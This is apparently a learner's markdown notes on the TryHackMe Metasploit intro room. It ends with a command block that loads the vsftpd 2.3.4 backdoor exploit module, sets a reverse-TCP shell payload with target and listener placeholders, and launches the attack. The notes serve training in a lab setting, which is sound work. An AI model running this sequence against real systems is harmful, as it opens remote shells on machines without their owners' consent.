# TryHackMe – Metasploit

## 💣 Room Info
- Room: [Metasploit](https://tryhackme.com/room/metasploitintro)
- Username: siinon
- Difficulty: Easy

---

## 🧠 What I Learned
- Got familiar with **Metasploit Framework**, a powerful tool used for exploitation and post-exploitation
- Learned how to search for exploits, set payloads, and configure targets
- Practiced exploiting a vulnerable system using a known exploit module

---

## 🛠️ Tools / Skills Practiced
- Running `msfconsole` and using built-in Metasploit commands
- Searching for exploit modules and matching them to discovered services
- Setting options like RHOST, RPORT, and payload
- Launching exploits and interacting with a remote shell

---

## ⚙️ Common Metasploit Commands

```bash
search vsftpd                  # find relevant exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST <your-ip>
exploit                        # launch the attack
